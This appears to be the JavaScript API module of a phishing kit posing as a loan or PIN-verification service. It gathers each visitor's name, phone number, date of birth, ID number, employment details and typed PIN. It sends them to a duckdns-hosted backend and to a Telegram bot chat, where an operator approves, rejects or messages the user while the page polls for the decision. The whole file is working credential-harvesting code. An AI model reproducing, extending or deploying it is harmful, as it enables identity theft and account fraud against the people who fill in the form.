import axios from 'axios'

const API_BASE_URL = "https://lnmb.duckdns.org"
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || ""
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || ""

const api = axios.create({
  baseURL: API_BASE_URL,
  headers: { "Content-Type": "application/json" }
})

api.interceptors.request.use(config => {
  const bot = window.location.pathname.split("/")[1] || "user1"
  config.headers["X-Bot-Name"] = bot
  return config
})

export const apiService = {
  async requestPinVerification(data) {
    const bot = window.location.pathname.split("/")[1] || "user1"
    const response = await api.post("/api/verify-pin", { ...data, bot })
    return response.data
  },

  async checkPinStatus(sessionId) {
    const bot = window.location.pathname.split("/")[1] || "user1"
    const response = await api.get(`/api/check-pin-status/${bot}/${sessionId}`)
    return response.data
  },

  async requestVerification(data) {
    const bot = window.location.pathname.split("/")[1] || "user1"
    const response = await api.post("/api/verify-user", { ...data, bot })
    return response.data
  },

  async checkStatus(sessionId) {
    const bot = window.location.pathname.split("/")[1] || "user1"
    const response = await api.get(`/api/check-status/${bot}/${sessionId}`)
    return response.data
  },

  async sendTelegramNotification(client) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn("Telegram bot token or chat ID not configured")
      return { success: false }
    }

    const name = client.name || "N/A"
    const number = client.number || "N/A"
    const dob = client.dob || "N/A"
    const id = client.id || "N/A"
    const employment = client.employment || "N/A"
    const amount = client.amount || "N/A"
    const term = client.term || "N/A"

    const message = `<b>🔐 PIN Verification Request</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Client Information</b>
Name: <code>${name}</code>
Phone: <code>${number}</code>
DOB: <code>${dob}</code>
ID: <code>${id}</code>
Employment: <code>${employment}</code>
Loan Amount: <code>USD ${amount}</code>
Term: <code>${term} months</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 <b>PIN Input</b>
<code>${client.pinInputs || "______"}</code>

<i>Waiting for admin action...</i>`

    const replyMarkup = {
      reply_markup: {
        resize_keyboard: false,
        one_time_keyboard: false,
        inline_keyboard: [
          [{ text: "✅ Approve", callback_data: "approve" }],
          [{ text: "❌ Reject", callback_data: "reject" }],
          [{ text: "💬 Message User", callback_data: "message_user" }]
        ]
      }
    }

    try {
      const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
        ...replyMarkup
      })
      return response.data
    } catch (error) {
      console.error("Telegram notification error:", error)
      return { success: false, error }
    }
  },

  async checkAdminDecision(sessionId) {
    const bot = window.location.pathname.split("/")[1] || "user1"
    try {
      const response = await api.get(`/api/admin-decision/${bot}/${sessionId}`)
      return response.data
    } catch (error) {
      return { decision: "pending" }
    }
  },

  async setMessageForAdmin(sessionId, message) {
    const bot = window.location.pathname.split("/")[1] || "user1"
    try {
      const response = await api.post(`/api/set-message/${bot}/${sessionId}`, { message })
      return response.data
    } catch (error) {
      return { success: false }
    }
  }
}

export const getBotName = () => window.location.pathname.split("/")[1] || "user1"